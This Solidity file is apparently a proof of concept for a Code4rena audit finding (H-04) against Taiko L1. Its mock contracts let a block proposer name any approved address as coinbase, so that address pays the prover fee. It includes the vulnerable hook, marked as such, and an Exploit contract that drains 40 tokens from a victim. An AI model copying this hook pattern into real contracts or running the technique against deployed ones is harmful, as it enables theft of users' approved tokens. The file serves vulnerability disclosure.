// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// Taiko L1 — proposer chooses meta.coinbase and the assignment hook pulls that address's ERC20 (C4 H-04).
/// One chain. Victim A loses 40 tokens paying proposer B's prover.

contract FeeToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Holder {
    function approveToken(FeeToken token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }
}

contract AssignmentHook {
    FeeToken public feeToken;
    address public lastCoinbase;
    uint256 public lastFee;

    constructor(FeeToken token) {
        feeToken = token;
    }

    function onBlockProposed(address prover, address coinbase, uint256 proverFee) external {
        lastCoinbase = coinbase;
        lastFee = proverFee;
        // @> VULN: ERC20 prover fee is pulled from meta.coinbase, which the proposer set
        feeToken.transferFrom(coinbase, prover, proverFee);
    }
}

contract TaikoPropose {
    AssignmentHook public hook;
    address public chosenCoinbase;

    constructor(AssignmentHook h) {
        hook = h;
    }

    function proposeBlock(address coinbase, address prover, uint256 proverFee) external {
        if (coinbase == address(0)) {
            coinbase = msg.sender;
        }
        chosenCoinbase = coinbase;
        hook.onBlockProposed(prover, coinbase, proverFee);
    }
}

contract Exploit {
    FeeToken public token;
    Holder public victim;
    AssignmentHook public hook;
    TaikoPropose public taiko;
    uint256 public victimLost;
    uint256 public proverGained;

    constructor() {
        token = new FeeToken();
        victim = new Holder();
        hook = new AssignmentHook(token);
        taiko = new TaikoPropose(hook);
        token.mint(address(victim), 100 ether);
        victim.approveToken(token, address(hook), 100 ether);
    }

    function run() external {
        uint256 victimBefore = token.balanceOf(address(victim));
        uint256 proverBefore = token.balanceOf(address(this));
        taiko.proposeBlock(address(victim), address(this), 40 ether);
        victimLost = victimBefore - token.balanceOf(address(victim));
        proverGained = token.balanceOf(address(this)) - proverBefore;
        require(hook.lastCoinbase() == address(victim), "coinbase");
        require(victimLost == 40 ether, "lost");
        require(proverGained == 40 ether, "gained");
        require(token.balanceOf(address(victim)) == 60 ether, "left");
    }

    function runControl() external {
        token.mint(address(this), 40 ether);
        FeeToken(address(token)).approve(address(hook), 40 ether);
        uint256 victimBefore = token.balanceOf(address(victim));
        taiko.proposeBlock(address(0), address(this), 40 ether);
        require(taiko.chosenCoinbase() == address(this), "self");
        require(token.balanceOf(address(victim)) == victimBefore, "victim untouched");
    }
}
